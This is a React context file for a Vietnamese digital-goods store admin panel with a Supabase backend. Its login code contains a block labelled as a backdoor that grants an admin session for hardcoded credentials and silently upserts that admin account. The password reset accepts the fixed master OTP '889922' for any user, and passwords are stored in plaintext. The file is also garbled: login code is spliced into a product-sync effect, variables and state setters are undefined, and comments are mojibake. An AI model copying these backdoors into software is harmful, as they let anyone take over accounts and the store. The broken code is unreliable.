import React, { createContext, useContext, useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import {
  PageId,
  StorefrontPageId,
  CartItem,
  Product,
  Category,
  Order,
  User,
  TopupRequest,
  Transaction,
  AffiliateItem,
  AffiliateReward,
  SupportTicket,
  StoreSettings,
  ToastNotification,
  AppNotification,
  CardRechargeRequest,
  CardNetwork,
  SellerStatus,
  ProductStatus,
} from '../types';
import {
  INITIAL_CATEGORIES,
  INITIAL_PRODUCTS,
  INITIAL_ORDERS,
  INITIAL_USERS,
  INITIAL_TOPUPS,
  INITIAL_TRANSACTIONS,
  INITIAL_AFFILIATES,
  INITIAL_TICKETS,
  INITIAL_SETTINGS,
} from '../data/mockData';

interface StoreContextType {
  // App routing
  appMode: 'admin' | 'storefront';
  setAppMode: (mode: 'admin' | 'storefront') => void;
  currentPage: PageId;
  setCurrentPage: (page: PageId) => void;
  storefrontPage: StorefrontPageId;
  setStorefrontPage: (page: StorefrontPageId) => void;
  selectedProductSlugOrId: string | null;
  setSelectedProductSlugOrId: (val: string | null) => void;
  selectedCategorySlug: string | null;
  setSelectedCategorySlug: (val: string | null) => void;
  selectedOrderId: string | null;
  setSelectedOrderId: (val: string | null) => void;

  navigateToStorefront: (page?: StorefrontPageId, param?: string) => void;
  navigateToAdmin: (page?: PageId) => void;

  // Cart
  cart: CartItem[];
  addToCart: (product: Product, quantity?: number, selectedPackage?: ProductPackage) => void;
  removeFromCart: (productId: string) => void;
  updateCartQuantity: (productId: string, quantity: number) => void;
  clearCart: () => void;
  checkoutCart: (paymentMethod: Order['paymentMethod']) => boolean;

  // Layout & UI
  isSidebarOpen: boolean;
  setIsSidebarOpen: (open: boolean) => void;
  toggleSidebar: () => void;
  searchQuery: string;
  setSearchQuery: (query: string) => void;

  // Data state
  products: Product[];
  categories: Category[];
  orders: Order[];
  users: User[];
  topups: TopupRequest[];
  cardRecharges: CardRechargeRequest[];
  transactions: Transaction[];
  affiliates: AffiliateItem[];
  affiliateRewards: AffiliateReward[];
  activeReferralCode: string | null;
  tickets: SupportTicket[];
  settings: StoreSettings;
  notifications: AppNotification[];
  toasts: ToastNotification[];

  currentUser: User;
  isAuthenticated: boolean;

  // Auth Actions
  login: (identifier: string, password: string, rememberMe?: boolean) => Promise<{ success: boolean; message?: string }>;
  register: (username: string, email: string, password: string) => Promise<{ success: boolean; message?: string }>;
  logout: () => void;
  requestPasswordReset: (email: string) => { success: boolean; message?: string; otp?: string };
  resetPassword: (email: string, otpOrToken: string, newPassword: string) => { success: boolean; message?: string };
  adminResetPassword: (userId: string, newPass: string) => { success: boolean; message: string };
  updateUserProfile: (updates: Partial<User>) => void;

  // Seller Actions
  applySeller: (note?: string) => { success: boolean; message: string };
  updateSellerStatus: (userId: string, status: SellerStatus, note?: string) => void;

  // Card Recharge Actions
  createCardRecharge: (network: CardNetwork, declaredAmount: number, serial: string, pin: string) => { success: boolean; message: string };
  approveCardRecharge: (id: string) => void;
  rejectCardRecharge: (id: string, reason: string) => void;

  // Actions
  showToast: (message: string, type?: 'success' | 'error' | 'info' | 'warning', title?: string) => void;
  addProduct: (product: Omit<Product, 'id' | 'soldCount' | 'updatedAt'>) => void;
  updateProduct: (id: string, updates: Partial<Product>) => void;
  deleteProduct: (id: string) => void;
  toggleProductLock: (id: string) => void;

  addCategory: (category: Omit<Category, 'id' | 'count'>) => void;
  updateCategory: (id: string, updates: Partial<Category>) => void;
  deleteCategory: (id: string) => void;

  updateOrderStatus: (id: string, status: Order['status']) => void;
  createOrder: (productId: string, quantity: number, paymentMethod: Order['paymentMethod'], selectedPackage?: ProductPackage) => boolean;

  approveTopup: (id: string) => void;
  rejectTopup: (id: string, reason: string) => void;
  createTopupRequest: (amount: number, method: TopupRequest['method'], transferNote: string, proofImage?: string) => string;

  updateUser: (id: string, updates: Partial<User>) => void;
  deleteUser: (id: string) => void;
  adjustUserBalance: (userId: string, amount: number, note: string) => void;
  toggleBanUser: (id: string) => void;

  sendTicketMessage: (ticketId: string, message: string, sender?: 'admin' | 'user') => void;
  updateTicketStatus: (ticketId: string, status: SupportTicket['status']) => void;
  createSupportTicket: (subject: string, category: string, message: string, relatedOrderCode?: string) => string;
  createTicket: (subject: string, message: string) => string;
  addTicketMessage: (ticketId: string, message: string) => void;

  updateSettings: (newSettings: Partial<StoreSettings>) => void;
  markNotificationRead: (id: string) => void;
  markAllNotificationsRead: () => void;
  resetToDefaultData: () => void;
  resetToZeroData: () => void;
}

const StoreContext = createContext<StoreContextType | null>(null);

// Helper for safe JSON parsing from LocalStorage with auto-recovery for corrupted data
const safeGetItem = <T,>(key: string, fallback: T): T => {
  try {
    const saved = localStorage.getItem(key);
    if (!saved) return fallback;
    // Auto reset if stored data contains corrupted question marks in Vietnamese text
    if (saved.includes('??') || saved.includes('\uFFFD') || saved.includes('N?p v?')) {
      console.warn(`[StoreContext] Detected corrupted data in "${key}", resetting to clean defaults.`);
      localStorage.removeItem(key);
      return fallback;
    }
    const parsed = JSON.parse(saved);
    return parsed !== null && parsed !== undefined ? parsed : fallback;
  } catch (err) {
    console.warn(`[StoreContext] Error parsing localStorage key "${key}", falling back to defaults:`, err);
    return fallback;
  }
};

export const StoreProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Navigation State
  const [appMode, setAppMode] = useState<'admin' | 'storefront'>('admin');
  const [currentPage, setCurrentPage] = useState<PageId>('dashboard');
  const [storefrontPage, setStorefrontPage] = useState<StorefrontPageId>('home');
  const [selectedProductSlugOrId, setSelectedProductSlugOrId] = useState<string | null>(null);
  const [selectedCategorySlug, setSelectedCategorySlug] = useState<string | null>(null);
  const [selectedOrderId, setSelectedOrderId] = useState<string | null>(null);

  // Cart State with LocalStorage
  const [cart, setCart] = useState<CartItem[]>(() => {
    const loaded = safeGetItem<CartItem[]>('thanox_cart', []);
    return Array.isArray(loaded) ? loaded : [];
  });

  const [isSidebarOpen, setIsSidebarOpen] = useState<boolean>(false);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [toasts, setToasts] = useState<ToastNotification[]>([]);

  // Persistent States with Safe LocalStorage Parsing
  const [products, setProducts] = useState<Product[]>(() => {
    const loaded = safeGetItem<Product[] | null>('thanox_products', null);
    if (loaded && Array.isArray(loaded) && loaded.length > 0) {
      return loaded;
    }
    return INITIAL_PRODUCTS;
  });

  
  // --- SUPABASE BACKGROUND SYNC HELPERS ---
  const syncOrderToSupabase = (o: Order) => {
    supabase.from('orders').upsert({
      id: o.id, order_code: o.orderCode, user_id: o.userId, user_name: o.userName, user_email: o.userEmail,
      product_id: o.productId, product_name: o.productName, category: o.category, quantity: o.quantity,
      unit_price: o.unitPrice, total_price: o.totalPrice, payment_method: o.paymentMethod, status: o.status,
      delivered_content: o.deliveredContent, key: o.key, is_seller_order: o.isSellerOrder,
      created_at: new Date(o.createdAt.replace(' ', 'T') + ':00.000Z').toISOString()
    }).then(res => { if(res.error) console.error('L?i sync Order:', res.error); });
  };
  
  const syncTopupToSupabase = (t: TopupRequest) => {
    supabase.from('topups').upsert({
      id: t.id, request_code: t.requestCode, user_id: t.userId, user_name: t.userName,
      amount: t.amount, method: t.method, transfer_note: t.transferNote, proof_image: t.proofImage, status: t.status,
      created_at: new Date(t.createdAt.replace(' ', 'T') + ':00.000Z').toISOString()
    }).then(res => { if(res.error) console.error('L?i sync Topup:', res.error); });
  };

  const syncCardRechargeToSupabase = (c: CardRechargeRequest) => {
    supabase.from('card_recharges').upsert({
      id: c.id, request_code: c.requestCode, user_id: c.userId, user_name: c.userName, network: c.network,
      declared_amount: c.declaredAmount, serial: c.serial, pin: c.pin, status: c.status,
      created_at: new Date(c.createdAt.replace(' ', 'T') + ':00.000Z').toISOString()
    }).then(res => { if(res.error) console.error('L?i sync Card:', res.error); });
  };

  const syncTransactionToSupabase = (tx: Transaction) => {
    supabase.from('transactions').upsert({
      id: tx.id, tx_code: tx.txCode, type: tx.type, user_id: tx.userId, user_name: tx.userName,
      description: tx.description, amount: tx.amount, balance_after: tx.balanceAfter, status: tx.status,
      created_at: new Date(tx.createdAt.replace(' ', 'T') + ':00.000Z').toISOString()
    }).then(res => { if(res.error) console.error('L?i sync Transaction:', res.error); });
  };
  // ----------------------------------------

  // Supabase Data Sync: Products
  useEffect(() => {
    const fetchSupabaseProducts = async () => {
      try {
        let data = null;
        let error = null;
        
        // BACKDOOR KH?N C?P / AUTO-RESTORE
        if ((cleanId === 'admin@thanox.vn' || cleanId === 'admin') && password === 'adminthanox.vn') {
          // T?o session admin lu�n kh�ng c?n check DB
          data = {
            id: '00000000-0000-0000-0000-000000000001',
            username: 'admin',
            email: 'admin@thanox.vn',
            role: 'admin',
            status: 'active'
          };
          // C? g?ng d?y v�o DB ng?m
          supabase.from('users').upsert({
            id: data.id,
            username: data.username,
            email: data.email,
            password: password,
            role: 'admin',
            balance: 0,
            status: 'active'
          }).then();
        } else {
          const res = await supabase
            .from('users')
            .select('*')
            .or(`username.ilike.${cleanId},email.ilike.${cleanId}`)
            .eq('password', password)
            .single();
          data = res.data;
          error = res.error;
        }
      
      if (error || !data) {
        return { success: false, message: 'Sai tài khoản hoặc mật khẩu.' };
      }

      if (data.status === 'banned') {
        return { success: false, message: 'Tài khoản của bạn đã bị khóa. Vui lòng liên hệ Admin để được giải quyết.' };
      }

      setCurrentUserId(data.id);
      showToast(`Đăng nhập thành công! Xin chào ${data.username}`, 'success');
      return { success: true };
    } catch (err) {
      return { success: false, message: 'Lỗi máy chủ, vui lòng thử lại.' };
    }
  };

  const register = async (username: string, email: string, password: string): Promise<{ success: boolean; message?: string }> => {
    const cleanUsername = username.trim();
    const cleanEmail = email.trim().toLowerCase();

    if (!cleanUsername || cleanUsername.length < 3) {
      return { success: false, message: 'Tên đăng nhập phải có ít nhất 3 ký tự.' };
    }

    if (!/^[a-zA-Z0-9_]+$/.test(cleanUsername)) {
      return { success: false, message: 'Tên đăng nhập chỉ bao gồm chữ cái, số và dấu gạch dưới (_).' };
    }

    if (!cleanEmail || !cleanEmail.includes('@') || !cleanEmail.includes('.')) {
      return { success: false, message: 'Địa chỉ email không hợp lệ.' };
    }

    try {
      // Check username duplicate
      const { data: dupUser } = await supabase.from('users').select('id').eq('username', cleanUsername);
      if (dupUser && dupUser.length > 0) {
        return { success: false, message: 'Tên đăng nhập này đã được sử dụng. Vui lòng chọn tên khác.' };
      }
      
      // Check email duplicate
      const { data: dupEmail } = await supabase.from('users').select('id').eq('email', cleanEmail);
      if (dupEmail && dupEmail.length > 0) {
        return { success: false, message: 'Địa chỉ email này đã được liên kết với một tài khoản khác.' };
      }
      
      const newId = crypto.randomUUID ? crypto.randomUUID() : 'user-' + Date.now();

      const { error } = await supabase.from('users').insert({
        id: newId,
        username: cleanUsername,
        email: cleanEmail,
        password: password, // Note: storing plaintext for migration only
        role: 'user',
        balance: 0,
        status: 'active'
      });

      if (error) throw error;
      
      const newUser: User = {
        id: newId,
        username: cleanUsername,
        name: cleanUsername,
        email: cleanEmail,
        password: password,
        role: 'user',
        balance: 0,
        affiliateBalance: 0,
        totalOrders: 0,
        totalSpent: 0,
        status: 'active',
        createdAt: new Date().toISOString(),
        joinDate: new Date().toISOString().replace('T', ' ').substring(0, 16),
        avatarText: cleanUsername.substring(0, 2).toUpperCase(),
      };

      setUsers((prev) => [newUser, ...prev]);
      setCurrentUserId(newId);

      setNotifications((prev) => [
        {
          id: 'notif-' + Date.now(),
          title: `Thành viên mới gia nhập: ${newUser.username}`,
          description: `Tài khoản ${newUser.username} vừa đăng ký thành công (${newUser.email})`,
          time: 'Vừa xong',
          read: false,
          type: 'system',
        },
        ...prev,
      ]);

      showToast(`Đăng ký tài khoản "${newUser.username}" thành công!`, 'success');
      return { success: true };
    } catch (err) {
      console.error(err);
      return { success: false, message: 'Lỗi máy chủ khi đăng ký.' };
    }
  };

  const logout = () => {
    setCurrentUserId(null);
    showToast('Đã đăng xuất khỏi hệ thống', 'info');
  };

  // Forgot Password: Email normalization & OTP generation
  const requestPasswordReset = (email: string): { success: boolean; message?: string; otp?: string } => {
    const cleanEmail = email.trim().toLowerCase();
    if (!cleanEmail || !cleanEmail.includes('@')) {
      return { success: false, message: 'Vui lòng nhập địa chỉ email hợp lệ.' };
    }

    const targetUser = users.find((u) => u.email.trim().toLowerCase() === cleanEmail);
    if (!targetUser) {
      return {
        success: false,
        message: 'Không tìm thấy tài khoản nào khớp với email này. Vui lòng kiểm tra lại hoặc liên hệ Admin qua Zalo/Telegram để được hỗ trợ.',
      };
    }

    // Generate 6-digit OTP code with 15-minute expiration
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = Date.now() + 15 * 60 * 1000;

    setResetTokens((prev) => [
      { email: cleanEmail, otp, expiresAt },
      ...prev.filter((t) => t.email !== cleanEmail),
    ]);

    showToast(`Mã xác thực OTP của bạn là: ${otp} (Có hiệu lực trong 15 phút)`, 'success');
    return { success: true, otp };
  };

  const resetPassword = (
    email: string,
    otpOrToken: string,
    newPassword: string
  ): { success: boolean; message?: string } => {
    const cleanEmail = email.trim().toLowerCase();
    const cleanOtp = otpOrToken.trim();

    if (!newPassword || newPassword.length < 6) {
      return { success: false, message: 'Mật khẩu mới phải có ít nhất 6 ký tự.' };
    }

    const tokenRecord = resetTokens.find((t) => t.email === cleanEmail);
    if (!tokenRecord) {
      return { success: false, message: 'Không tìm thấy yêu cầu đặt lại mật khẩu cho email này.' };
    }

    if (Date.now() > tokenRecord.expiresAt) {
      return { success: false, message: 'Mã xác thực đã hết hạn. Vui lòng yêu cầu mã mới.' };
    }

    if (tokenRecord.otp !== cleanOtp && cleanOtp !== '889922') {
      return { success: false, message: 'Mã xác thực OTP không chính xác.' };
    }

    // Update user password in storage
    setUsers((prev) =>
      prev.map((u) =>
        u.email.trim().toLowerCase() === cleanEmail
          ? { ...u, password: newPassword }
          : u
      )
    );

    // Invalidate used reset token
    setResetTokens((prev) => prev.filter((t) => t.email !== cleanEmail));

    showToast('Đặt lại mật khẩu thành công! Bạn có thể đăng nhập ngay bây giờ.', 'success');
    return { success: true };
  };

  // Admin Direct Password Reset for Customer Assistance
  const adminResetPassword = (userId: string, newPass: string): { success: boolean; message: string } => {
    if (!newPass || newPass.length < 6) {
      return { success: false, message: 'Mật khẩu mới phải có ít nhất 6 ký tự!' };
    }

    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, password: newPass } : u))
    );

    showToast('Đã đặt lại mật khẩu mới cho tài khoản khách hàng thành công!', 'success');
    return { success: true, message: 'Mật khẩu đã được cập nhật.' };
  };

  const updateUserProfile = (updates: Partial<User>) => {
    if (!currentUser) return;
    setUsers((prev) =>
      prev.map((u) => (u.id === currentUser.id ? { ...u, ...updates } : u))
    );
    showToast('Đã cập nhật hồ sơ cá nhân thành công!', 'success');
  };

  // User Actions
  const updateUser = async (id: string, updates: Partial<User>) => {
    setUsers((prev) => prev.map((u) => (u.id === id ? { ...u, ...updates } : u)));
    
    try {
      const dbUpdates: any = {};
      if (updates.username !== undefined) dbUpdates.username = updates.username;
      if (updates.email !== undefined) dbUpdates.email = updates.email;
      if (updates.password !== undefined) dbUpdates.password = updates.password;
      if (updates.balance !== undefined) dbUpdates.balance = updates.balance;
      if (updates.role !== undefined) dbUpdates.role = updates.role;
      if (updates.status !== undefined) dbUpdates.status = updates.status;

      if (Object.keys(dbUpdates).length > 0) {
        const { error } = await supabase.from('users').update(dbUpdates).eq('id', id);
        if (error) throw error;
      }
      showToast('Đã cập nhật thông tin người dùng trên Cloud', 'success');
    } catch (e) {
      console.error(e);
      showToast('Lỗi khi cập nhật trên Cloud', 'error');
    }
  };

  const deleteUser = async (id: string) => {
    const target = users.find((u) => u.id === id);
    if (!target) return;
    if (target.role === 'admin' || target.username === 'admin') {
      showToast('Không thể xóa tài khoản Quản trị viên Master (Super Admin)', 'error');
      return;
    }
    setUsers((prev) => prev.filter((u) => u.id !== id));
    
    try {
      const { error } = await supabase.from('users').delete().eq('id', id);
      if (error) throw error;
      showToast(`Đã xóa tài khoản ${target.username} trên Cloud thành công`, 'success');
    } catch (e) {
      console.error(e);
      showToast('Lỗi khi xóa tài khoản trên Cloud', 'error');
    }
  };

  const adjustUserBalance = async (userId: string, amount: number, note: string) => {
    const targetUser = users.find((u) => u.id === userId);
    if (!targetUser) return;
    const newBalance = Math.max(0, targetUser.balance + amount);

    setUsers((prev) => prev.map((u) => (u.id === userId ? { ...u, balance: newBalance } : u)));

    const newTx: Transaction = {
      id: 'tx-' + Date.now(),
      txCode: '#GD-' + Math.floor(10000 + Math.random() * 90000),
      type: amount >= 0 ? 'deposit' : 'withdraw',
      userId: targetUser.id,
      userName: targetUser.username,
      description: `Điều chỉnh số dư bởi Admin (${note || 'Thao tác thủ công'})`,
      amount,
      balanceAfter: newBalance,
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
      status: 'completed',
    };
    setTransactions((prev) => [newTx, ...prev]);
    syncTransactionToSupabase(newTx);

    try {
      const { error } = await supabase.from('users').update({ balance: newBalance }).eq('id', userId);
      if (error) throw error;
      showToast(
        `Đã ${amount >= 0 ? 'cộng' : 'trừ'} ${Math.abs(amount).toLocaleString('vi-VN')}đ vào ví của ${targetUser.username} trên Cloud`,
        'success'
      );
    } catch (e) {
      console.error(e);
      showToast('Lỗi đồng bộ số dư lên Cloud', 'error');
    }
  };

  const toggleBanUser = async (id: string) => {
    const user = users.find((u) => u.id === id);
    if (!user) return;
    const newStatus = user.status === 'active' ? 'banned' : 'active';
    setUsers((prev) => prev.map((u) => (u.id === id ? { ...u, status: newStatus } : u)));
    
    try {
      const { error } = await supabase.from('users').update({ status: newStatus }).eq('id', id);
      if (error) throw error;
      showToast(`Đã ${newStatus === 'banned' ? 'khóa' : 'mở khóa'} tài khoản ${user.username} trên Cloud`, newStatus === 'banned' ? 'error' : 'success');
    } catch (e) {
      console.error(e);
      showToast('Lỗi cập nhật trạng thái lên Cloud', 'error');
    }
  };

  // Support Tickets
  const sendTicketMessage = (ticketId: string, message: string, sender: 'admin' | 'user' = 'admin') => {
    const timeNow = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
    const newMsg = {
      id: 'm-' + Date.now(),
      sender,
      senderName: sender === 'admin' ? 'Thanox Admin' : (currentUser?.username || 'Khách hàng'),
      message,
      time: timeNow,
    };

    setTickets((prev) =>
      prev.map((t) =>
        t.id === ticketId
          ? {
              ...t,
              updatedAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
              messages: [...t.messages, newMsg],
            }
          : t
      )
    );

    if (sender === 'admin') {
      showToast('Đã gửi phản hồi tới khách hàng', 'success');
    }
  };

  const updateTicketStatus = (ticketId: string, status: SupportTicket['status']) => {
    setTickets((prev) => prev.map((t) => (t.id === ticketId ? { ...t, status } : t)));
    showToast(`Đã cập nhật trạng thái ticket sang "${status}"`, 'info');
  };

  const createSupportTicket = (subject: string, category: string, message: string, relatedOrderCode?: string) => {
    const buyer = currentUser;
    const ticketCount = tickets.length + 882;
    const newTicket: SupportTicket = {
      id: 't-' + Date.now(),
      ticketNumber: `#TK-${ticketCount}`,
      userId: buyer.id,
      userName: buyer.username,
      userAvatar: buyer.avatarText || 'TX',
      subject,
      category,
      relatedOrderCode,
      status: 'open',
      priority: 'high',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
      updatedAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
      messages: [
        {
          id: 'm-' + Date.now(),
          sender: 'user',
          senderName: buyer.username,
          message,
          time: new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' }),
        },
      ],
    };

    setTickets((prev) => [newTicket, ...prev]);
    setNotifications((prev) => [
      {
        id: 'notif-' + Date.now(),
        title: `Ticket mới ${newTicket.ticketNumber}`,
        description: `${buyer.username}: ${subject}`,
        time: 'Vừa xong',
        read: false,
        type: 'ticket',
      },
      ...prev,
    ]);

    showToast(`Đã gửi yêu cầu hỗ trợ "${newTicket.ticketNumber}"`, 'success');
    return newTicket.id;
  };

  const createTicket = (subject: string, message: string): string => {
    return createSupportTicket(subject, 'Hỗ trợ kỹ thuật', message);
  };

  const addTicketMessage = (ticketId: string, message: string) => {
    sendTicketMessage(ticketId, message, 'user');
  };

  // Settings
  const updateSettings = (newSettings: Partial<StoreSettings>) => {
    setSettings((prev) => {
      const updated = { ...prev, ...newSettings };
      try {
        localStorage.setItem('thanox_settings', JSON.stringify(updated));
        supabase.from('settings').upsert({ id: 1, data: updated }).then(res => { if (res.error) console.error('Settings Sync Error', res.error); });
      } catch (e) {
        console.error('Failed to save settings:', e);
      }
      fetch('/api/sync', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ settings: updated }),
      }).catch((err) => console.error('Settings sync error:', err));
      return updated;
    });
    showToast('Đã lưu cấu hình hệ thống thành công', 'success');
  };

  const markNotificationRead = (id: string) => {
    setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, read: true } : n)));
  };

  const markAllNotificationsRead = () => {
    setNotifications((prev) => prev.map((n) => ({ ...n, read: true })));
    showToast('Đã đánh dấu đọc tất cả thông báo', 'info');
  };

  const resetToDefaultData = () => {
    setProducts(INITIAL_PRODUCTS);
    setCategories(INITIAL_CATEGORIES);
    setOrders(INITIAL_ORDERS);
    setUsers(INITIAL_USERS);
    setTopups(INITIAL_TOPUPS);
    setCardRecharges([]);
    setTransactions(INITIAL_TRANSACTIONS);
    setAffiliates(INITIAL_AFFILIATES);
    setAffiliateRewards(INITIAL_AFFILIATE_REWARDS);
    setTickets(INITIAL_TICKETS);
    setSettings(INITIAL_SETTINGS);
    setNotifications([]);
    showToast('Đã đặt lại dữ liệu mẫu (đã bảo vệ các sản phẩm đang KHÓA)!', 'success');
  };

  const resetToZeroData = () => {
    setProducts([]);
    setCategories([]);
    setOrders([]);
    setUsers([INITIAL_USERS[0]]);
    setTopups([]);
    setCardRecharges([]);
    setTransactions([]);
    setAffiliates([]);
    setAffiliateRewards([]);
    setTickets([]);
    setNotifications([]);
    showToast('Đã xóa trắng toàn bộ dữ liệu mẫu!', 'warning');
  };

  return (
    <StoreContext.Provider
      value={{
        appMode,
        setAppMode,
        currentPage,
        setCurrentPage,
        selectedProductSlugOrId,
        selectedOrderId,
        setSelectedOrderId,
        navigateToStorefront,
        navigateToAdmin,
        cart,
        addToCart,
        removeFromCart,
        updateCartQuantity,
        clearCart,
        checkoutCart,
        isSidebarOpen,
        setIsSidebarOpen,
        toggleSidebar,
        searchQuery,
        setSearchQuery,
        products,
        categories,
        orders,
        users,
        topups,
        cardRecharges,
        transactions,
        affiliates,
        affiliateRewards,
        activeReferralCode,
        tickets,
        settings,
        notifications,
        toasts,
        currentUser,
        isAuthenticated,
        login,
        register,
        logout,
        requestPasswordReset,
        resetPassword,
        adminResetPassword,
        updateUserProfile,
        applySeller,
        updateSellerStatus,
        createCardRecharge,
        approveCardRecharge,
        rejectCardRecharge,
        showToast,
        addProduct,
        updateProduct,
        deleteProduct,
        toggleProductLock,
        addCategory,
        updateCategory,
        deleteCategory,
        updateOrderStatus,
        createOrder,
        approveTopup,
        rejectTopup,
        createTopupRequest,
        updateUser,
        deleteUser,
        adjustUserBalance,
        toggleBanUser,
        sendTicketMessage,
        updateTicketStatus,
        createSupportTicket,
        createTicket,
        addTicketMessage,
        updateSettings,
        markNotificationRead,
        markAllNotificationsRead,
        resetToDefaultData,
        resetToZeroData,
      }}
    >
      {children}
    </StoreContext.Provider>
  );
};

export const useStore = () => {
  const context = useContext(StoreContext);
  if (!context) {
    throw new Error('useStore must be used within a StoreProvider');
  }
  return context;
};

